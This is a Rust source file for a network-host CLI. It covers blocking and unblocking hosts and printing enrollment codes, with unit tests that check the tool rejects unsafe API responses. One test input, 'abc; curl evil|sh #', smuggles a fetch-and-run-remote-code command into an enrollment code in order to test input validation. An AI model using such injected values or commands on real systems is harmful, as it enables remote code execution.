use anyhow::bail;
use serde_json::Value;

use super::checked_enroll_code;
use crate::api::Client;
use crate::cli::{HostEnrollCodeArgs, HostGetArgs};
use crate::ids::validate_id;
use crate::output::{OutputMode, data_object, sanitize_for_display, str_field};

/// Block one host. `--json` prints the updated host as the API returns it.
pub fn hosts_block(client: &Client, args: &HostGetArgs, output: OutputMode) -> anyhow::Result<()> {
    validate_id("host", &args.host_id)?;
    let res = client.block_host(&args.host_id)?;
    output.emit(&res, |res| {
        let host = data_object(res, "host")?;
        print!("{}", render_blocked(&args.host_id, host, true)?);
        Ok(())
    })
}

/// Unblock one host. `--json` prints the updated host as the API returns it.
pub fn hosts_unblock(
    client: &Client,
    args: &HostGetArgs,
    output: OutputMode,
) -> anyhow::Result<()> {
    validate_id("host", &args.host_id)?;
    let res = client.unblock_host(&args.host_id)?;
    output.emit(&res, |res| {
        let host = data_object(res, "host")?;
        print!("{}", render_blocked(&args.host_id, host, false)?);
        Ok(())
    })
}

/// Issue a fresh enrollment code for an existing host.
pub fn hosts_enroll_code(
    client: &Client,
    args: &HostEnrollCodeArgs,
    output: OutputMode,
) -> anyhow::Result<()> {
    validate_id("host", &args.host_id)?;
    let res = client.create_enrollment_code(&args.host_id, args.code_lifetime)?;
    output.emit(&res, |res| {
        let data = data_object(res, "enrollment code")?;
        print!("{}", render_enroll_code(&args.host_id, data)?);
        Ok(())
    })
}

/// `Blocked host "name" (id)` plus the command that undoes it, for the host
/// the user asked about. Fails unless the response is that host with
/// `isBlocked` already in the wanted state: a "Blocked" the API didn't confirm
/// would tell someone a lost device is cut off when it may not be.
fn render_blocked(requested: &str, host: &Value, blocked: bool) -> anyhow::Result<String> {
    let (verb, state) = if blocked {
        ("block", "blocked")
    } else {
        ("unblock", "unblocked")
    };
    let got = host.get("id").and_then(Value::as_str);
    if got.is_some_and(|id| id != requested) {
        bail!(
            "unexpected response: asked to {verb} {requested} but the API returned host {}",
            sanitize_for_display(got.unwrap_or_default())
        );
    }
    if host.get("isBlocked").and_then(Value::as_bool) != Some(blocked) {
        bail!(
            "the API did not confirm that host {requested} is {state}; \
             check with `dn host get {requested}`"
        );
    }
    let name = sanitize_for_display(str_field(host, "name"));
    let label = match name.trim() {
        "" => requested.to_string(),
        shown => format!("\"{shown}\" ({requested})"),
    };
    Ok(if blocked {
        format!(
            "Blocked host {label}\n\
             It can't reach, or be reached by, other hosts until you run:\n  \
             dn host unblock {requested}\n"
        )
    } else {
        format!("Unblocked host {label}\n")
    })
}

/// The human view of a new enrollment code: the command to run on the device
/// and when the code expires. Refuses a response without a usable code
/// rather than print a `dnclient enroll` line that can't work, or one that
/// isn't safe to paste.
fn render_enroll_code(host_id: &str, data: &Value) -> anyhow::Result<String> {
    let code = checked_enroll_code(str_field(data, "code"))?;
    let mut out = format!(
        "Enrollment code for {host_id}\n\n\
         On the device, install dnclient and run:\n  dnclient enroll {code}\n"
    );
    match data["lifetimeSeconds"].as_u64() {
        Some(0) => bail!("unexpected response: the enrollment code has a lifetime of 0 seconds"),
        Some(secs) => out.push_str(&format!(
            "\nThe code expires in {}.\n",
            human_duration(secs)
        )),
        None => {}
    }
    Ok(out)
}

/// Seconds as days, hours, and minutes, skipping zero parts: `86400` is
/// `1d`, `5400` is `1h 30m`. Under a minute shows seconds.
fn human_duration(secs: u64) -> String {
    let parts: Vec<String> = [
        (secs / 86_400, "d"),
        (secs % 86_400 / 3600, "h"),
        (secs % 3600 / 60, "m"),
    ]
    .into_iter()
    .filter(|(n, _)| *n > 0)
    .map(|(n, unit)| format!("{n}{unit}"))
    .collect();
    if parts.is_empty() {
        format!("{secs}s")
    } else {
        parts.join(" ")
    }
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    const ID: &str = "host-KQ4ZB7MXRWEPNA2C5TJ3YVHLDI";
    const OTHER: &str = "host-M6TLA3VZQ2NXKC7EWJR5PBYHFO";

    #[test]
    fn blocked_names_the_host_and_how_to_undo_it() {
        let host = json!({"id": ID, "name": "Build Server", "isBlocked": true});
        assert_eq!(
            render_blocked(ID, &host, true).unwrap(),
            format!(
                "Blocked host \"Build Server\" ({ID})\n\
                 It can't reach, or be reached by, other hosts until you run:\n  \
                 dn host unblock {ID}\n"
            )
        );
    }

    #[test]
    fn unblocked_is_one_line() {
        let host = json!({"id": ID, "name": "Build Server", "isBlocked": false});
        assert_eq!(
            render_blocked(ID, &host, false).unwrap(),
            format!("Unblocked host \"Build Server\" ({ID})\n")
        );
    }

    #[test]
    fn a_nameless_or_idless_host_is_shown_by_the_requested_id() {
        for host in [
            json!({"id": ID, "name": "  ", "isBlocked": false}),
            json!({"isBlocked": false}),
        ] {
            assert_eq!(
                render_blocked(ID, &host, false).unwrap(),
                format!("Unblocked host {ID}\n")
            );
        }
        let out = render_blocked(ID, &json!({"isBlocked": true}), true).unwrap();
        assert!(out.ends_with(&format!("dn host unblock {ID}\n")), "{out}");
    }

    #[test]
    fn an_unconfirmed_state_is_an_error_not_a_success() {
        for (host, blocked) in [
            (json!({"id": ID, "isBlocked": false}), true),
            (json!({"id": ID, "isBlocked": true}), false),
            (json!({"id": ID}), true),
            (json!({"id": ID, "isBlocked": "true"}), true),
        ] {
            let err = render_blocked(ID, &host, blocked).unwrap_err().to_string();
            assert!(err.contains("did not confirm"), "{host}: {err}");
        }
    }

    #[test]
    fn a_response_for_another_host_is_an_error() {
        let host = json!({"id": OTHER, "isBlocked": true});
        let err = render_blocked(ID, &host, true).unwrap_err().to_string();
        assert!(err.contains(OTHER) && err.contains(ID), "{err}");
    }

    #[test]
    fn names_are_stripped_of_terminal_escapes() {
        let host = json!({"id": ID, "name": "\u{1b}[31mevil", "isBlocked": true});
        assert!(!render_blocked(ID, &host, true).unwrap().contains('\u{1b}'));
    }

    #[test]
    fn enroll_code_prints_the_command_and_expiry() {
        let data = json!({"code": "H8NEbm99QvupjqW1PsdVR9DNSiFmoQtJXyGTQxerlSU", "lifetimeSeconds": 86400});
        assert_eq!(
            render_enroll_code(ID, &data).unwrap(),
            format!(
                "Enrollment code for {ID}\n\n\
                 On the device, install dnclient and run:\n  \
                 dnclient enroll H8NEbm99QvupjqW1PsdVR9DNSiFmoQtJXyGTQxerlSU\n\n\
                 The code expires in 1d.\n"
            )
        );
    }

    #[test]
    fn enroll_code_without_a_lifetime_skips_the_expiry_line() {
        let out = render_enroll_code(ID, &json!({"code": "abc"})).unwrap();
        assert!(!out.contains("expires"), "{out}");
    }

    #[test]
    fn enroll_code_refuses_a_missing_unsafe_or_dead_code() {
        for data in [
            json!({}),
            json!({"code": ""}),
            json!({"code": 42}),
            json!({"code": "abc; curl evil|sh #"}),
            json!({"code": "abc\u{202e}def"}),
            json!({"code": "abc", "lifetimeSeconds": 0}),
        ] {
            assert!(render_enroll_code(ID, &data).is_err(), "{data}");
        }
    }

    #[test]
    fn durations_skip_zero_parts() {
        for (secs, want) in [
            (59, "59s"),
            (60, "1m"),
            (5400, "1h 30m"),
            (86_400, "1d"),
            (90_061, "1d 1h 1m"),
            (604_800, "7d"),
        ] {
            assert_eq!(human_duration(secs), want, "{secs}");
        }
    }
}
